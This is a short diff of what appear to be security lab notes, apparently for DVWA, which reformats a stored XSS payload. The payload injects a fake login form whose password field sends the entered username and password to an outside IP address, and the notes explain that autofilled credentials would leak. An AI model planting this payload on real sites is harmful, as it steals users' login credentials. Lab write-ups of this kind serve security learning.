@@ -152,7 +152,8 @@ security=low; PHPSESSID=ae2efb5757e6d8b6d9c1931b610819e5
 ## XSS to steal username/password
 ### payload:
 ```html
-<input name=username id=username><input type=password name=password onchange="if(this.value.length)fetch('http://20.20.20.129',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">
+<input name=username id=username>
+<input type=password name=password onchange="if(this.value.length)fetch('http://20.20.20.129',{method:'POST',mode: 'no-cors',body:username.value+':'+this.value});">
 ```
 anyone who views the comments will see a login form. if his browser autofills the username and password fields, they would be posted to the url included in the payload
 ### output:
